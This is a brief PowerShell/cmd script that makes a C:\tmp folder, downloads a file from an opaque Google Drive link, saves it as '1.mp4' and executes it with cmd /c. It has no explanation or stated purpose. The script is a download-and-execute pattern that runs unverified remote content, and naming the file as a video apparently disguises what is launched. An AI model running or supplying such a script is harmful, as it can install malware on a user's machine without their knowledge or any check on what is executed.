mkdir C:\tmp
C:
cd C:\tmp
dir

$zipFile = "https://drive.google.com/uc?export=download&id=15zI29a-T3Cp27Dd2Efwa0xdnJyUJ_xuH"
Invoke-WebRequest -Uri $zipFile -OutFile "C:\tmp\1.mp4"

cmd /c "C:\tmp\1.mp4"